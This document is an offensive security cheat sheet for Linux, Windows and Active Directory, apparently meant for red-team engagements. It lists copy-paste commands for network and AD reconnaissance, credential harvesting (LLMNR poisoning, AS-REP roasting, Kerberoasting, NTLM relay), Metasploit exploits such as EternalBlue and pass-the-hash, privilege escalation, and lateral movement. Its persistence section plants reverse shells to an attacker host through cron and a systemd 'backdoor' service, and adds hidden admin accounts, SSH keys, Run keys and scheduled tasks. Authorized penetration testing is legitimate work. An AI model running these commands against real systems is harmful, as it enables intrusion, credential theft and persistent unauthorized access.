# ======================================================================================
# ATTACK PLAYBOOK — FULL UPDATED CHEAT SHEET (Linux, Windows, AD)
# Red teaming window. Copy-paste as needed. Metasploit modules included.
# ======================================================================================

# --- PHASE 1: RECON & ENUMERATION ----------------------------------------------------

# Network Sweep
ip route                                                                        # find your subnet
nmap -sn 10.0.5.0/24                                                            # find live hosts
nmap -sS -T4 --open -p- --min-rate 2000 10.0.5.0/24 -oA recon/all_hosts         # fast full-port scan
nmap -sV -sC -O -T4 -p- 10.0.5.20 -oA recon/target_20                          # detailed service scan

# Web Enumeration
ffuf -u http://10.0.5.20/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
nikto -h http://10.0.5.20
curl -s http://10.0.5.20/.git/HEAD                                              # exposed .git?
curl -s http://10.0.5.20/robots.txt http://10.0.5.20/sitemap.xml
searchsploit apache 2.4.49                                                       # search for exploits

# AD Enumeration (Unauthenticated)
enum4linux -a -u "" -p "" <DC_IP>                                                # SMB/guest enum
enum4linux -a -u "guest" -p "" <DC_IP>
nmap -n -sV --script "ldap* and not brute" -p 389 <DC_IP>
./kerbrute_linux_amd64 userenum -d domain.local --dc <DC_IP> usernames.txt      # user enumeration

# AD Enumeration (With Credentials)
bloodhound-python -u lowpriv -p 'Password123' -d corp.local -c All --zip       # BloodHound collection
nxc smb <DC_IP> -u 'user' -p 'pass' --shares --users --groups --loggedon       # netexec (CME)
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname               # PowerView: Kerberoastable
Get-DomainComputer -Unconstrained                                               # Unconstrained delegation
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|WriteOwner'} # ACL abuse paths
SharpHound.exe -c All                                                           # SharpHound (from Windows foothold)

# --- PHASE 2: INITIAL ACCESS (CREDENTIAL HARVESTING) ---------------------------------

# AD Credential Harvesting (No Creds)
sudo responder -I eth0 -wrf                                                    # LLMNR/NBT-NS poisoning
GetNPUsers.py corp.local/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt # AS-REP Roast
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt                     # crack AS-REP

# AD Credential Harvesting (Low-Priv Creds)
GetUserSPNs.py corp.local/lowpriv:'Password123' -dc-ip <DC_IP> -request -outputfile kerberoast.txt # Kerberoast (Impacket)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force        # crack Kerberoast

# NTLM Relay
nxc smb 10.0.0.0/24 --gen-relay-list relay-targets.txt
impacket-ntlmrelayx -tf relay-targets.txt -smb2support --escalate-user attacker # relay to LDAP for ACL abuse

# --- PHASE 2.5: METASPLOIT NATIVE AD/WINDOWS ATTACKS ---------------------------------

# Kerberoasting (Native Metasploit)
msfconsole
use auxiliary/gather/kerberoast
set RHOSTS <DC_IP>
set LDAPUSERNAME <user>
set LDAPPASSWORD <password>
set LDAPDOMAIN <domain.local>
run
# Then crack the harvested hashes:
use auxiliary/analyze/crack_windows
set HASH_FORMAT 13100
run

# AS-REP Roasting (Native Metasploit)
use auxiliary/gather/asrep
set RHOSTS <DC_IP>
set DOMAIN <domain.local>
set USER_FILE users.txt
run

# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-IP>
exploit

# Pass-the-Hash (PsExec)
use exploit/windows/smb/psexec
set RHOSTS <target-IP>
set SMBUser <user>
set SMBPass <LM_hash>:<NT_hash>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-IP>
exploit

# Golden Ticket Forging (requires krbtgt hash)
use auxiliary/admin/kerberos/forge_ticket
set DOMAIN <domain.local>
set SID <domain_SID>
set KRBTGT_HASH <krbtgt_NT_hash>
set USER <user_to_impersonate>
run

# --- PHASE 3: PRIVILEGE ESCALATION ---------------------------------------------------

# Linux Privesc
uname -a; cat /etc/os-release                                                   # system info
sudo -l                                                                          # what can you run as root?
find / -perm -4000 -type f 2>/dev/null                                          # SUID binaries
find / -perm -2000 -type f 2>/dev/null                                          # SGID binaries
getcap -r / 2>/dev/null                                                         # file capabilities
cat /etc/crontab; ls -la /etc/cron.*; crontab -l                                # cron jobs
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Common SUID Exploits
bash -p                                                                          # SUID bash
vim -c ':!/bin/sh'                                                               # SUID vim
find . -exec /bin/sh -p \; -quit                                                 # SUID find
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'                         # SUID python

# Windows Privesc
whoami /priv; whoami /groups                                                    # privileges
systeminfo; wmic qfe get Caption,Description,HotFixID,InstalledOn               # patch level
wmic service get name,displayname,pathname,startmode | findstr /i "auto"         # unquoted service paths
cmdkey /list                                                                    # stored credentials
.\winPEAS.exe                                                                   # automated enumeration

# AlwaysInstallElevated (Windows Privesc)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/adduser USER=backdoor PASS=P@ssword123! -f msi -o alwe.msi
msiexec /quiet /qn /i C:\Users\Public\alwe.msi

# DCSync (requires DA or Replicating Directory Changes rights)
impacket-secretsdump corp.local/Administrator:'Password123'@<DC_IP>

# --- PHASE 4: PERSISTENCE ------------------------------------------------------------

# Linux Persistence
mkdir -p /root/.ssh && echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys # SSH key
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" >> /etc/crontab # cron
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor.service && systemctl start backdoor.service           # systemd

# Windows Persistence
net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add # local admin
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\shell.exe" /sc minute /mo 1 /ru SYSTEM # scheduled task
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe" /f # Run key
sc create Backdoor binPath= "cmd /c C:\temp\shell.exe" start= auto && sc start Backdoor # service

# AD Persistence (Post-Domain Admin)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator # Golden Ticket (Impacket)

# --- PHASE 5: LATERAL MOVEMENT -------------------------------------------------------

psexec.py -hashes <LM>:<NT> domain/user@10.0.5.30                               # Pass-the-Hash (Impacket)
.\Rubeus.exe ptt /ticket:<base64_ticket>                                         # Pass-the-Ticket
wmiexec.py domain/user:password@10.0.5.30                                       # WMI
evil-winrm -i 10.0.5.30 -u user -p password                                     # WinRM
msf6 > use post/multi/manage/autoroute                                           # Pivoting
msf6 > set SESSION 1
msf6 > run

# --- QUICK REFERENCE ----------------------------------------------------------------
# RECON:      nmap -sn 10.0.5.0/24 ; nmap -sS -T4 --open -p- 10.0.5.0/24
#             bloodhound-python -u user -p pass -d corp.local -c All --zip
# EXPLOIT:    msfconsole; use <module>; set RHOSTS <target>; set LHOST <your-ip>; run
# KERB:       msf > use auxiliary/gather/kerberoast; set LDAPUSERNAME/PASSWORD/DOMAIN; run
#             GetUserSPNs.py domain/user:pass -dc-ip DC -request -outputfile k.txt
# ASREP:      msf > use auxiliary/gather/asrep; set DOMAIN; set USER_FILE users.txt; run
#             GetNPUsers.py domain/ -dc-ip DC -usersfile users.txt -no-pass
# BRUTE:      hydra -l root -P rockyou.txt ssh://target
# POST-EX:    whoami; id; sudo -l; find / -perm -4000 -type f 2>/dev/null
# PERSIST:    echo "key" >> /root/.ssh/authorized_keys
#             schtasks /create /tn "Upd" /tr "C:\temp\shell.exe" /sc minute /ru SYSTEM
# PIVOT:      msf6 > use post/multi/manage/autoroute; set SESSION 1; run
# ======================================================================================
